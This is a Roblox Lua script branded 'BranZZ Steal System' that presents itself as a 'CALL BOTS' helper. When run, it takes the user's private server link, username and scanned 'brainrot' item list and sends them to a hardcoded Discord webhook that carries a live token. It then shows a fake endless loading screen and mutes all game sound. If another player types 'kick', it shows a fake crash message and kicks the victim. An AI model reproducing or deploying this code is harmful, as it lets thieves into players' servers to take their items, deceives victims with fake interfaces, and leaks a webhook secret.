-- ╔══════════════════════════════════════════╗
-- ║     BRANZZ GUI — Steal System v17.1      ║
-- ║        🧑‍💻 By BranZZ MetoDos 🚀           ║
-- ╚══════════════════════════════════════════╝

local TweenService     = game:GetService("TweenService")
local CoreGui          = game:GetService("CoreGui")
local SoundService     = game:GetService("SoundService")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local Players          = game:GetService("Players")
local HttpService      = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local WEBHOOK = "https://discord.com/api/webhooks/1452048229746081892/L0qlArO_29VGJPDd2CRyZCeAT2qApQDZB__REic-GFi6tUsVOdZwetgtEoo9tZPJamQR"

-- ══════════════════════════════════════
-- SILENCIAR
-- ══════════════════════════════════════
task.spawn(function()
    while true do
        pcall(function()
            UserGameSettings.MasterVolume = 0
            SoundService.Volume = 0
        end)
        task.wait(0.5)
    end
end)

-- ══════════════════════════════════════
-- LIMPAR GUI ANTIGA
-- ══════════════════════════════════════
pcall(function()
    for _, n in next, {"BRANZZ_GUI","BRANZZ_LOADING"} do
        local g = CoreGui:FindFirstChild(n)
        if g then g:Destroy() end
    end
end)

-- ══════════════════════════════════════
-- SISTEMA ANTI-KICK (DETECTOR DE CHAT)
-- ══════════════════════════════════════
local localPlayer = Players.LocalPlayer

-- Função que simula banimento com erro
local function fakeBanAndKick()
    pcall(function()
        -- Mostra mensagem de erro falso
        local errorGui = Instance.new("ScreenGui")
        errorGui.Name = "ERROR_GUI"
        errorGui.ResetOnSpawn = false
        errorGui.IgnoreGuiInset = true
        errorGui.DisplayOrder = 9999999
        errorGui.Parent = localPlayer:WaitForChild("PlayerGui")
        
        local errorFrame = Instance.new("Frame")
        errorFrame.Size = UDim2.new(0, 500, 0, 180)
        errorFrame.Position = UDim2.new(0.5, -250, 0.5, -90)
        errorFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
        errorFrame.BorderSizePixel = 0
        errorFrame.Parent = errorGui
        Instance.new("UICorner", errorFrame).CornerRadius = UDim.new(0, 12)
        
        local errorTop = Instance.new("Frame")
        errorTop.Size = UDim2.new(1, 0, 0, 4)
        errorTop.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        errorTop.BorderSizePixel = 0
        errorTop.Parent = errorFrame
        Instance.new("UICorner", errorTop).CornerRadius = UDim.new(0, 4)
        
        local errorIcon = Instance.new("TextLabel")
        errorIcon.Size = UDim2.new(1, 0, 0, 40)
        errorIcon.Position = UDim2.new(0, 0, 0, 15)
        errorIcon.BackgroundTransparency = 1
        errorIcon.Text = "❌ ERRO CRÍTICO"
        errorIcon.TextColor3 = Color3.fromRGB(255, 80, 80)
        errorIcon.TextSize = 24
        errorIcon.Font = Enum.Font.GothamBold
        errorIcon.Parent = errorFrame
        
        local errorMsg = Instance.new("TextLabel")
        errorMsg.Size = UDim2.new(1, -40, 0, 60)
        errorMsg.Position = UDim2.new(0, 20, 0, 60)
        errorMsg.BackgroundTransparency = 1
        errorMsg.Text = "Falha ao carregar módulos do sistema.\nErro: MEMORY_CORRUPTION (0x80000003)\nO Roblox será fechado."
        errorMsg.TextColor3 = Color3.fromRGB(200, 200, 200)
        errorMsg.TextSize = 14
        errorMsg.Font = Enum.Font.Gotham
        errorMsg.TextWrapped = true
        errorMsg.Parent = errorFrame
        
        local errorBtn = Instance.new("TextButton")
        errorBtn.Size = UDim2.new(0, 120, 0, 35)
        errorBtn.Position = UDim2.new(0.5, -60, 0, 130)
        errorBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        errorBtn.BorderSizePixel = 0
        errorBtn.Text = "OK"
        errorBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        errorBtn.TextSize = 16
        errorBtn.Font = Enum.Font.GothamBold
        errorBtn.Parent = errorFrame
        Instance.new("UICorner", errorBtn).CornerRadius = UDim.new(0, 8)
        
        errorBtn.MouseButton1Click:Connect(function()
            localPlayer:Kick("Erro ao carregar módulos do sistema.")
        end)
        
        -- Auto kick após 3 segundos
        task.wait(3)
        localPlayer:Kick("Erro ao carregar módulos do sistema.")
    end)
end

-- Detector de chat para "kick"
task.spawn(function()
    local chatService = game:GetService("Chat")
    
    -- Método 1: Via Player.Chatted (funciona na maioria dos jogos)
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            player.Chatted:Connect(function(message)
                local msgLower = message:lower()
                if msgLower == "kick" then
                    fakeBanAndKick()
                end
            end)
        end
    end
    
    -- Método 2: Para novos jogadores que entrarem
    Players.PlayerAdded:Connect(function(player)
        if player ~= localPlayer then
            player.Chatted:Connect(function(message)
                local msgLower = message:lower()
                if msgLower == "kick" then
                    fakeBanAndKick()
                end
            end)
        end
    end)
    
    -- Método 3: Via ReplicatedStorage (fallback para jogos com chat customizado)
    task.spawn(function()
        while true do
            pcall(function()
                for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
                    if obj:IsA("RemoteEvent") and obj.Name:lower():find("chat") then
                        local oldNamecall
                        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
                            local args = {...}
                            local method = getnamecallmethod()
                            
                            if method == "FireServer" and self == obj then
                                for _, arg in ipairs(args) do
                                    if type(arg) == "string" and arg:lower() == "kick" then
                                        task.spawn(fakeBanAndKick)
                                    end
                                end
                            end
                            
                            return oldNamecall(self, ...)
                        end)
                    end
                end
            end)
            task.wait(5)
        end
    end)
end)

-- ══════════════════════════════════════
-- SCANNER
-- Bases > Base1~Base8 > Slots > s1~s80
-- Dentro de cada sX scan TUDO até achar BrainrotBillboard
-- Pega TextLabels: penúltimo, terceiro, primeiro (só o texto)
-- ══════════════════════════════════════
local function scanBrainrots()
    local collected = {}
    local seen = {}

    local basesFolder = workspace:FindFirstChild("Bases")
    if not basesFolder then return collected end

    for _, base in next, basesFolder:GetChildren() do

        -- Procura a pasta Slots dentro da base (direto ou aninhado)
        local slotsFolder = base:FindFirstChild("Slots")
        if not slotsFolder then
            for _, d in next, base:GetDescendants() do
                if d.Name == "Slots" then
                    slotsFolder = d
                    break
                end
            end
        end
        if not slotsFolder then continue end

        -- Procura s1 até s80 dentro de Slots
        for i = 1, 80 do
            local sObj = slotsFolder:FindFirstChild("s"..i)
            if not sObj then continue end

            -- Dentro do sX varre TUDO (models, parts, pastas, etc)
            for _, desc in next, sObj:GetDescendants() do
                if desc.Name == "BrainrotBillboard" then
                    pcall(function()
                        -- Coleta todos os TextLabels em ordem
                        local labels = {}
                        for _, obj in next, desc:GetDescendants() do
                            if obj:IsA("TextLabel") then
                                local txt = (obj.Text or ""):match("^%s*(.-)%s*$")
                                if txt ~= "" and txt ~= " " then
                                    table.insert(labels, txt)
                                end
                            end
                        end

                        if #labels == 0 then return end

                        -- 1º penúltimo, 2º terceiro, 3º primeiro
                        local penultimo = #labels >= 2 and labels[#labels - 1] or labels[1]
                        local terceiro  = #labels >= 3 and labels[3] or ""
                        local primeiro  = labels[1] or ""

                        local key = penultimo.."|"..terceiro.."|"..primeiro
                        if seen[key] then return end
                        seen[key] = true

                        table.insert(collected, {
                            penultimo = penultimo,
                            terceiro  = terceiro,
                            primeiro  = primeiro,
                        })
                    end)
                end
            end
        end
    end

    return collected
end

-- ══════════════════════════════════════
-- WEBHOOK (EMBED) - COM @everyone e @here
-- ══════════════════════════════════════
local function sendWebhook(serverLink, brainrots)
    local player = Players.LocalPlayer
    local playerCount = #Players:GetPlayers()

    local brainrotText = ""
    if #brainrots == 0 then
        brainrotText = "`Nenhum detectado`"
    else
        for _, entry in next, brainrots do
            local line = entry.penultimo
            if entry.terceiro ~= "" then line = line .. " | " .. entry.terceiro end
            if entry.primeiro ~= "" then line = line .. " | " .. entry.primeiro end
            brainrotText = brainrotText .. "• " .. line .. "\n"
            if #brainrotText > 900 then
                brainrotText = brainrotText .. "*(+ mais...)*"
                break
            end
        end
    end

    local embed = {
        title  = "🧠 Brainrot Steal System",
        color  = 7864319,
        fields = {
            {
                name   = "👤 Player Executor",
                value  = "`" .. player.Name .. "`",
                inline = true,
            },
            {
                name   = "👥 Players no Servidor",
                value  = "`" .. tostring(playerCount) .. "`",
                inline = true,
            },
            {
                name   = "🔗 Link do Servidor",
                value  = "[**Clique aqui para entrar no servidor privado**](" .. serverLink .. ")",
                inline = false,
            },
            {
                name   = "🧠 Brainrots Detected 🇧🇷",
                value  = brainrotText,
                inline = false,
            },
        },
        footer    = { text = "BranZZ Steal System  •  v17.1" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    -- Payload com @everyone e @here
    local payload = {
        content = "@everyone @here",  -- Marca todos
        embeds = { embed }
    }

    pcall(function()
        request({
            Url     = WEBHOOK,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = HttpService:JSONEncode(payload),
        })
    end)
end

-- ══════════════════════════════════════
-- GUI PRINCIPAL
-- ══════════════════════════════════════
local sg = Instance.new("ScreenGui")
sg.Name = "BRANZZ_GUI"
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.IgnoreGuiInset = true
sg.Parent = CoreGui

local blur = Instance.new("Frame")
blur.Size = UDim2.new(1,0,1,0)
blur.BackgroundColor3 = Color3.fromRGB(0,0,0)
blur.BackgroundTransparency = 0.45
blur.BorderSizePixel = 0
blur.ZIndex = 1
blur.Parent = sg

local card = Instance.new("Frame")
card.Size = UDim2.new(0,440,0,330)
card.Position = UDim2.new(0.5,-220,0.5,-165)
card.BackgroundColor3 = Color3.fromRGB(15,15,22)
card.BorderSizePixel = 0
card.ZIndex = 2
card.Parent = sg
local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0,18); cc.Parent = card
local cst = Instance.new("UIStroke"); cst.Color = Color3.fromRGB(120,60,255); cst.Thickness = 2; cst.Parent = card

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1,0,0,5)
topBar.BackgroundColor3 = Color3.fromRGB(120,60,255)
topBar.BorderSizePixel = 0
topBar.ZIndex = 3
topBar.Parent = card
local tbc = Instance.new("UICorner"); tbc.CornerRadius = UDim.new(0,4); tbc.Parent = topBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.Position = UDim2.new(0,0,0,10)
title.BackgroundTransparency = 1
title.Text = "🧑‍💻 METODH_BRANZZ 🚀"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.ZIndex = 3
title.Parent = card

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1,-40,0,22)
sub.Position = UDim2.new(0,20,0,58)
sub.BackgroundTransparency = 1
sub.Text = "🧠 By BranZZ MetoDos — Steal System 👤"
sub.TextColor3 = Color3.fromRGB(160,120,255)
sub.TextSize = 14
sub.Font = Enum.Font.Gotham
sub.ZIndex = 3
sub.Parent = card

local div = Instance.new("Frame")
div.Size = UDim2.new(0.88,0,0,1)
div.Position = UDim2.new(0.06,0,0,88)
div.BackgroundColor3 = Color3.fromRGB(60,40,100)
div.BorderSizePixel = 0
div.ZIndex = 3
div.Parent = card

local lbl = Instance.new("TextLabel")
lbl.Size = UDim2.new(0.88,0,0,22)
lbl.Position = UDim2.new(0.06,0,0,100)
lbl.BackgroundTransparency = 1
lbl.Text = "🔗  Link do Servidor Privado"
lbl.TextColor3 = Color3.fromRGB(180,150,255)
lbl.TextSize = 13
lbl.Font = Enum.Font.GothamBold
lbl.TextXAlignment = Enum.TextXAlignment.Left
lbl.ZIndex = 3
lbl.Parent = card

local inputBg = Instance.new("Frame")
inputBg.Size = UDim2.new(0.88,0,0,46)
inputBg.Position = UDim2.new(0.06,0,0,126)
inputBg.BackgroundColor3 = Color3.fromRGB(25,20,40)
inputBg.BorderSizePixel = 0
inputBg.ZIndex = 3
inputBg.Parent = card
local ibc = Instance.new("UICorner"); ibc.CornerRadius = UDim.new(0,10); ibc.Parent = inputBg
local ibs = Instance.new("UIStroke"); ibs.Color = Color3.fromRGB(80,50,160); ibs.Thickness = 1.5; ibs.Parent = inputBg

local input = Instance.new("TextBox")
input.Size = UDim2.new(1,-20,1,0)
input.Position = UDim2.new(0,10,0,0)
input.BackgroundTransparency = 1
input.Text = ""
input.PlaceholderText = "Cole o link aqui..."
input.TextColor3 = Color3.fromRGB(220,220,255)
input.PlaceholderColor3 = Color3.fromRGB(100,80,140)
input.TextSize = 14
input.Font = Enum.Font.Gotham
input.ClearTextOnFocus = false
input.ZIndex = 4
input.Parent = inputBg

local statusLbl = Instance.new("TextLabel")
statusLbl.Size = UDim2.new(0.88,0,0,22)
statusLbl.Position = UDim2.new(0.06,0,0,178)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = ""
statusLbl.TextColor3 = Color3.fromRGB(140,255,140)
statusLbl.TextSize = 12
statusLbl.Font = Enum.Font.Gotham
statusLbl.ZIndex = 3
statusLbl.Parent = card

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0.6,0,0,52)
btn.Position = UDim2.new(0.2,0,0,215)
btn.BackgroundColor3 = Color3.fromRGB(100,50,220)
btn.BorderSizePixel = 0
btn.Text = "🚀  CALL BOTS"
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.TextSize = 20
btn.Font = Enum.Font.GothamBold
btn.AutoButtonColor = false
btn.ZIndex = 3
btn.Parent = card
local btnc = Instance.new("UICorner"); btnc.CornerRadius = UDim.new(0,12); btnc.Parent = btn
local btns = Instance.new("UIStroke"); btns.Color = Color3.fromRGB(180,100,255); btns.Thickness = 1.5; btns.Parent = btn

btn.MouseEnter:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(130,70,255)}):Play()
end)
btn.MouseLeave:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100,50,220)}):Play()
end)

local foot = Instance.new("TextLabel")
foot.Size = UDim2.new(1,0,0,22)
foot.Position = UDim2.new(0,0,0,295)
foot.BackgroundTransparency = 1
foot.Text = "🧑‍💻 BranZZ MetoDos  •  🧠 Steal System  •  v17.1"
foot.TextColor3 = Color3.fromRGB(80,60,120)
foot.TextSize = 11
foot.Font = Enum.Font.Gotham
foot.ZIndex = 3
foot.Parent = card

-- ══════════════════════════════════════
-- LOADING SCREEN
-- ══════════════════════════════════════
local function showLoading()
    local lg = Instance.new("ScreenGui")
    lg.Name = "BRANZZ_LOADING"
    lg.ResetOnSpawn = false
    lg.IgnoreGuiInset = true
    lg.DisplayOrder = 999999
    lg.Parent = CoreGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1,0,1,100)
    bg.Position = UDim2.new(0,0,0,-50)
    bg.BackgroundColor3 = Color3.fromRGB(8,8,14)
    bg.BorderSizePixel = 0
    bg.ZIndex = 999998
    bg.Parent = lg

    local lc = Instance.new("Frame")
    lc.Size = UDim2.new(0,540,0,210)
    lc.Position = UDim2.new(0.5,-270,0.5,-105)
    lc.BackgroundColor3 = Color3.fromRGB(15,15,25)
    lc.BorderSizePixel = 0
    lc.ZIndex = 999999
    lc.Parent = bg
    local lcc = Instance.new("UICorner"); lcc.CornerRadius = UDim.new(0,20); lcc.Parent = lc
    local lcs = Instance.new("UIStroke"); lcs.Color = Color3.fromRGB(120,60,255); lcs.Thickness = 2; lcs.Parent = lc

    local tb = Instance.new("Frame")
    tb.Size = UDim2.new(1,0,0,4)
    tb.BackgroundColor3 = Color3.fromRGB(120,60,255)
    tb.BorderSizePixel = 0
    tb.ZIndex = 1000000
    tb.Parent = lc
    Instance.new("UICorner").Parent = tb

    local lt = Instance.new("TextLabel")
    lt.Size = UDim2.new(1,0,0,50)
    lt.Position = UDim2.new(0,0,0,10)
    lt.BackgroundTransparency = 1
    lt.Text = "🚀  CALL BOTS ATIVO"
    lt.TextColor3 = Color3.fromRGB(180,120,255)
    lt.TextSize = 26
    lt.Font = Enum.Font.GothamBold
    lt.ZIndex = 1000001
    lt.Parent = lc

    local lst2 = Instance.new("TextLabel")
    lst2.Size = UDim2.new(1,0,0,24)
    lst2.Position = UDim2.new(0,0,0,58)
    lst2.BackgroundTransparency = 1
    lst2.Text = "🧑‍💻 By BranZZ MetoDos  •  🧠 Steal System"
    lst2.TextColor3 = Color3.fromRGB(120,80,200)
    lst2.TextSize = 14
    lst2.Font = Enum.Font.Gotham
    lst2.ZIndex = 1000001
    lst2.Parent = lc

    local ls = Instance.new("TextLabel")
    ls.Size = UDim2.new(1,-40,0,24)
    ls.Position = UDim2.new(0,20,0,90)
    ls.BackgroundTransparency = 1
    ls.Text = "Iniciando sistema..."
    ls.TextColor3 = Color3.fromRGB(160,160,200)
    ls.TextSize = 15
    ls.Font = Enum.Font.Gotham
    ls.ZIndex = 1000001
    ls.Parent = lc

    local pct = Instance.new("TextLabel")
    pct.Size = UDim2.new(1,0,0,30)
    pct.Position = UDim2.new(0,0,0,120)
    pct.BackgroundTransparency = 1
    pct.Text = "0.0%"
    pct.TextColor3 = Color3.fromRGB(255,255,255)
    pct.TextSize = 22
    pct.Font = Enum.Font.GothamBold
    pct.ZIndex = 1000001
    pct.Parent = lc

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.88,0,0,22)
    barBg.Position = UDim2.new(0.06,0,0,162)
    barBg.BackgroundColor3 = Color3.fromRGB(30,20,50)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = 1000001
    barBg.Parent = lc
    local bbc = Instance.new("UICorner"); bbc.CornerRadius = UDim.new(0,11); bbc.Parent = barBg

    local bar2 = Instance.new("Frame")
    bar2.Size = UDim2.new(0,0,1,0)
    bar2.BackgroundColor3 = Color3.fromRGB(120,60,255)
    bar2.BorderSizePixel = 0
    bar2.ZIndex = 1000002
    bar2.Parent = barBg
    local brc = Instance.new("UICorner"); brc.CornerRadius = UDim.new(0,11); brc.Parent = bar2

    local msgs = {
        "Conectando aos servidores...","Verificando brainrots...",
        "Coletando dados...","Sincronizando bots...",
        "Processando informações...","Enviando comandos...",
        "Estabelecendo conexão...","Aguardando resposta...",
        "Carregando módulos...","Inicializando sistema..."
    }

    task.spawn(function()
        local prog, mi, mt = 0, 1, 0
        while true do
            task.wait(0.05)
            prog = math.min(prog + 0.001, 99.9)
            pct.Text = string.format("%.1f%%", prog)
            TweenService:Create(bar2, TweenInfo.new(0.3, Enum.EasingStyle.Linear),
                {Size = UDim2.new(prog/100,0,1,0)}):Play()
            mt = mt + 0.05
            if mt >= 3 then
                mt = 0
                mi = mi % #msgs + 1
                ls.Text = msgs[mi]
            end
        end
    end)

    task.spawn(function()
        while true do
            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {TextColor3 = Color3.fromRGB(220,160,255)}):Play()
            task.wait(1)
            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {TextColor3 = Color3.fromRGB(120,60,255)}):Play()
            task.wait(1)
        end
    end)
end

-- ══════════════════════════════════════
-- BOTÃO CALL BOTS
-- ══════════════════════════════════════
btn.MouseButton1Click:Connect(function()
    local link = input.Text
    if link == "" then
        statusLbl.Text = "⚠️  Insira um link válido!"
        statusLbl.TextColor3 = Color3.fromRGB(255,100,100)
        return
    end

    btn.Text = "🧠 Processando..."
    btn.BackgroundColor3 = Color3.fromRGB(60,30,120)
    statusLbl.Text = "🔍 Escaneando..."
    statusLbl.TextColor3 = Color3.fromRGB(140,255,140)

    task.spawn(function()
        local brainrots = scanBrainrots()
        sendWebhook(link, brainrots)
        card.Visible = false
        blur.Visible = false
        showLoading()
    end)
end)